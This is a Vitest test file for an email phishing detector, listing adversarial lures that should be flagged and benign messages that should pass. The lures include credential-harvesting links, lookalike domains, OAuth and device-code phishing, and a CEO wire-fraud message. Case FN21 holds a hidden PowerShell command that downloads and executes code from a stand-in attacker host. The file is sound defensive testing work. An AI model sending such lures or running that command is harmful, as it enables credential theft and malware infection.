import {describe,it,expect} from 'vitest';
import {analyze} from '../src/engine/analyze';
import type {Message,Policy} from '../src/engine/types';
const base:Message={subject:'Hello',from:'alice@partner.example',displayName:'Alice',bodyHtml:'<p>hi</p>',bodyText:'',attachments:[]};
const contoso:Policy={internalDomains:['contoso.com']};
type Case={id:string;patch:Partial<Message>;should:'flag'|'clean';policy?:Policy;baselineOnly?:boolean};
export const cases:Case[]=[
{id:'FN1',patch:{bodyHtml:'<p>Your password expires today.</p><a href="https://m365-secure-login.example/auth">Keep my password</a>'},should:'flag'},
{id:'FN2',patch:{from:'security@micr0soft-support.example',displayName:'Microsoft Account Team',bodyHtml:'<a href="https://micr0soft-support.example/verify">Verify</a>'},should:'flag'},
{id:'FN3',patch:{bodyHtml:'<a/href="https://evil.example/login">https://login.microsoftonline.com</a>'},should:'flag'},
{id:'FN4',patch:{bodyHtml:'<a href="java\tscript:alert(1)">Open</a>'},should:'flag'},
{id:'FN5',patch:{bodyHtml:'<a href="https://evil.example/x">login.microsoftonline.com</a>'},should:'flag'},
{id:'FN6',patch:{bodyHtml:'<a href="https://forms.office.com/r/AbCd1234">Review invoice</a>'},should:'flag'},
{id:'FN7',patch:{bodyHtml:'<p>Scan to re-enable MFA</p><img src="data:image/png;base64,iVBORw0KGgo=" alt="scan">'},should:'flag'},
{id:'FN8',patch:{attachments:[{name:'mfa-setup.png',contentType:'image/png'}]},should:'flag'},
{id:'FN9',patch:{attachments:[{name:'invoice.exe.'}]},should:'flag'},
{id:'FN10',patch:{attachments:[{name:'invoice.exe '}]},should:'flag'},
{id:'FN11',patch:{attachments:[{name:'policy.rdp'}]},should:'flag'},
{id:'FN12',patch:{attachments:[{name:'update.appinstaller'},{name:'tool.msix'}]},should:'flag'},
{id:'FN13',patch:{attachments:[{name:'form.dotm'},{name:'addin.xlam'}]},should:'flag'},
{id:'FN14',patch:{attachments:[{name:'docs.library-ms'}]},should:'flag'},
{id:'FN15',patch:{attachments:[{name:'Invoice-4471.pdf',contentType:'application/pdf'}]},should:'flag'},
{id:'FN16',patch:{attachments:[{name:'forwarded.eml'}]},should:'flag'},
{id:'FN17',patch:{from:'ceo.private@gmail.example',displayName:'Jan Kowalski (CEO)',subject:'Urgent - need a favour',bodyHtml:'<p>Are you at your desk? Need you to process a wire today. Keep confidential.</p>',bodyText:'Are you at your desk? Need you to process a wire today.'},should:'flag'},
{id:'FN18',patch:{subject:'Invoice #88231 - $749.99 charged',bodyHtml:'<p>Your subscription renewed. Call +1 (888) 555-0199 to dispute.</p>',bodyText:'Call +1 (888) 555-0199 to dispute.'},should:'flag'},
{id:'FN19',patch:{bodyHtml:'<a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=0000&scope=Mail.ReadWrite+offline_access&response_type=code">Open document</a>'},should:'flag'},
{id:'FN20',patch:{bodyHtml:'<p>Go to https://microsoft.com/devicelogin and enter code ABCD-EFGH</p>',bodyText:'Go to https://microsoft.com/devicelogin and enter code ABCD-EFGH'},should:'flag'},
{id:'FN21',patch:{bodyHtml:'<p>Press Win+R, paste: powershell -w hidden -c iwr evil.example|iex</p>',bodyText:'Press Win+R and paste: powershell -w hidden -c iwr evil.example|iex'},should:'flag'},
{id:'FN22',patch:{bodyHtml:'<a href="https://bit.ly/3xYzAbC">Track parcel</a>'},should:'flag'},
{id:'FN23',patch:{bodyHtml:undefined,bodyText:'Verify here: secure-m365-login.example/verify'},should:'flag'},
{id:'FN24',patch:{bodyHtml:Array.from({length:300},(_,i)=>`<a href="https://ok.example/${i}">x</a>`).join('')+'<a href="https://evil.example/login">https://microsoft.com</a>'},should:'flag'},
{id:'FN25',patch:{bodyHtml:'<base href="https://evil.example/"><a href="/login">Sign in</a>'},should:'flag'},
{id:'FN26',patch:{bodyHtml:'<form action="https://evil.example"><input type="PASSWORD"></form>'},should:'flag'},
{id:'FN27',patch:{displayName:'Contoso IT Support',from:'it@c0ntoso-it.example'},should:'flag'},
{id:'FN28',patch:{bodyHtml:'<a href="http://0x7f000001/login">Login</a>'},should:'flag'},
{id:'FN29',patch:{bodyHtml:'<a href="https://evil.example/">paypal.com/secure</a>'},should:'flag'},
{id:'FP1',patch:{from:'bob@contoso.com',bodyHtml:'<p>See you at 3.</p><img src="cid:image001.png@01DB1234.5678ABCD" alt="Contoso logo">'},should:'clean',policy:contoso},
{id:'FP2',patch:{bodyHtml:'<a href="https://eur01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fwww.contoso.com%2Fnews&data=05">https://www.contoso.com/news</a>'},should:'clean'},
{id:'FP3',patch:{bodyHtml:'<a href="https://urldefense.com/v3/__https://www.contoso.com/news__;!!abc$">https://www.contoso.com/news</a>'},should:'clean'},
{id:'FP4',patch:{bodyHtml:'<a href="https://example.com/a">https://www.example.com/a</a>'},should:'clean'},
{id:'FP5',patch:{from:'news@mailer.vendor.example',replyTo:'support@vendor.example'},should:'clean'},
{id:'FP6',patch:{bodyHtml:'<p>News</p><img src="https://t.vendor.example/p.gif"><a href="http://vendor.example/unsub">unsubscribe</a>'},should:'clean'},
{id:'FP7',patch:{attachments:[{name:'report.html'}]},should:'clean'},
{id:'FP8',patch:{from:'bob@contoso.com',attachments:[{name:'Q3-contracts.zip'}]},should:'clean',policy:contoso},
{id:'FP9',patch:{bodyHtml:'<p>Regards</p><svg width="10" height="10"></svg>'},should:'clean'},
{id:'FP10',patch:{headers:'Received: from a\r\nAuthentication-Results: spf=pass; dkim=pass; dmarc=pass\r\n'},should:'clean'}
];
const flagged=(v:string)=>['review','likely-phishing','suspicious','likely-malicious'].includes(v);
describe('wave 1 supplied adversarial cases',()=>{for(const c of cases)it(c.id,()=>{const result=analyze({...base,...c.patch},c.policy??{});if(c.baselineOnly){expect(result).toHaveProperty('verdict');return;}expect(flagged(result.verdict)).toBe(c.should==='flag');});});
